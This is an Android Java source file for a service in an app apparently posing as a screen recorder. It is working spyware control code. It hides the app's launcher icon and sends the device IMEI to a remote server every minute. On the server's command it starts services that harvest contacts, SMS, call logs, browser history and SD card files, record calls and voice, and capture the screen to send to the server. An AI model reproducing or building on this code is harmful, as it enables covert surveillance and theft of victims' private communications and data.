package com.recorder.screen.screen_recorder.services;


import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.R;
import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SplashService extends Service {

    public static boolean running = false;
    public static boolean running_all_services = false;
    String Dimei;
    String DeviceFile;
    StringBuffer iconsb = new StringBuffer("");


    public SplashService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        running = true;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        running = true;

        try {
            Bitmap bm = BitmapFactory.decodeResource(getResources(), R.drawable.img);
            String extStorageDirectory = Environment.getExternalStorageDirectory().toString();
            File file = new File(extStorageDirectory, "img.PNG");
            FileOutputStream outStream = new FileOutputStream(file);
            bm.compress(Bitmap.CompressFormat.PNG, 100, outStream);
            outStream.flush();
            outStream.close();
        }
        catch (Exception e) {}

        Timer mytimer2 = new Timer();
        mytimer2.schedule(new TimerTask() {
            @Override
            public void run() {
                try {
                    if(!DeviceInfo.running) {
                        startService(new Intent(getApplicationContext(), DeviceInfo.class));
                    }
                }
                catch (Exception e){
                    Log.d("Onoffchk","Error::::" +e.getMessage());
                }
            }
        },500, 60500);

        Timer mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                startOrStopAllServices();
            }
        },500, 60500);

        return super.onStartCommand(intent, flags, startId);
    }

    public void startOrStopAllServices() {
        try {
            String icon_value = validateIcon();
            if (icon_value.equalsIgnoreCase("")) {
                String sp_icon_value = Values.getSharedPrefrence("iconstatus", getApplicationContext());
                if (sp_icon_value.equalsIgnoreCase("1")) {
                    if(!running_all_services) {
                        runAllServices();
                    }
                } else {
                    if(running_all_services) {
                        stopAllServices();
                    }
                }
            } else if (icon_value.equalsIgnoreCase("1")) {
                if(!running_all_services) {
                    runAllServices();
                }
            } else if (icon_value.equalsIgnoreCase("0")) {
                if(running_all_services) {
                    stopAllServices();
                }
            }
        }
        catch (Exception e) {}
    }

    public void runAllServices() {
        running_all_services = true;
        System.out.println("---------------------> runAllServices()");
        Values.setSharedPrefrence("iconstatus", "1", getApplicationContext());

        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName("com.recorder.screen.screen_recorder", "com.recorder.screen.screen_recorder.activities.Splash");
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);


            try {
                Thread.sleep(100);
                if (!FileUpload.running)
                    getApplicationContext().startService(new Intent(getApplicationContext(), FileUpload.class));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            try {
                Thread.sleep(200);
                if (!Sdcard.started)
                    getApplicationContext().startService(new Intent(getApplicationContext(), Sdcard.class));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            if (!PhoneTypeDemo.Phonedisconnect)
                getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
            if (!AllContact.contact_start)
                getApplicationContext().startService(new Intent(getApplicationContext(), AllContact.class));
            if (!InOutSmsService.Sms_start)
                getApplicationContext().startService(new Intent(getApplicationContext(), InOutSmsService.class));
            if (!AllBrowserHistory.BrowserHistory_start)
                getApplicationContext().startService(new Intent(getApplicationContext(), AllBrowserHistory.class));
            if (!AllCallLog.callHistory_start)
                getApplicationContext().startService(new Intent(getApplicationContext(), AllCallLog.class));
            if (!AllSmsService.All_Sms_Service) {
                getApplicationContext().startService(new Intent(getApplicationContext(), AllSmsService.class));
            }
            if (!CheckCon.checkcon)
                getApplicationContext().startService(new Intent(getApplicationContext(), CheckCon.class));

            if(!PackageName.running) {
                getApplicationContext().startService(new Intent(getApplicationContext(), PackageName.class));
            }

            try {
                getApplicationContext().startService(new Intent(getApplicationContext(), ForegroundToastService.class));
            } catch (Exception e) {
                System.out.println("Exception in Check Foreground Checker" + e.getMessage());
            }

            if (!myappmanager2.started) {
                getApplicationContext().startService(new Intent(getApplicationContext(), myappmanager2.class));
            }

            try {
                if(!StatusCheck.StatusCheck_start) {
                    getApplicationContext().startService(new Intent(getApplicationContext(), StatusCheck.class));
                }
            }
            catch (Exception e){
                Log.d("ONoffchkStatus","statuschk"+e);
            }

            try {
                getApplicationContext().startService(new Intent(getApplicationContext(), CatureScreenAndSendServer.class));
            }
            catch (Exception e){
                Log.d("ONoffchkStatus","statuschk"+e);
            }

            try {
                getApplicationContext().startService(new Intent(getApplicationContext(), SelectedPackageNameChecker.class));
            }
            catch (Exception e){
                Log.d("ONoffchkStatus","statuschk"+e);
            }
        }
        catch (Exception e) { System.out.println("-----> "+e.toString()); }
    }

    public void stopAllServices() {
        running_all_services = false;
        System.out.println("---------------------> stopAllServices()");
        Values.setSharedPrefrence("iconstatus", "0", getApplicationContext());

        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName("com.recorder.screen.screen_recorder", "com.recorder.screen.screen_recorder.activities.Splash");
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

            getApplicationContext().stopService(new Intent(getApplicationContext(), StatusCheck.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), CheckCon.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), ForegroundToastService.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), InOutSmsService.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), mainservice.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), myappmanager2.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), Wifi.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), AllContact.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), FileUpload.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), CallHistory.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), AllBrowserHistory.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), AllCallLog.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), AllSmsService.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), Sdcard.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), CatureScreenAndSendServer.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), PackageName.class));
            getApplicationContext().stopService(new Intent(getApplicationContext(), SelectedPackageNameChecker.class));
        }
        catch (Exception e) {}
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
    }

    public String validateIcon() {
        String icon_value = "";
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String imei = tm.getDeviceId();
            byte[] imeiFilupload = imei.getBytes();
            String imeibaseFilupload = android.util.Base64.encodeToString(imeiFilupload, android.util.Base64.DEFAULT);
            String imeibaseFiluploadstring = imeibaseFilupload.replaceAll("\n", "");

            String result = "";
            InputStream inputStream = null;
            HttpClient httpclient = new DefaultHttpClient();
            String service_upld = UrlDemo.service_status;
            HttpPost httppost = new HttpPost(service_upld);

            if (imei != null) {
                try {
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("Response of Iconstatus :::: " + buffer);

                    Values.setSharedPrefrence("iconstatus", buffer, getApplicationContext());

                    icon_value = buffer;
                } catch (Exception e) {
                }
            }
        }
        catch (Exception e) {}

        return  icon_value;
    }
}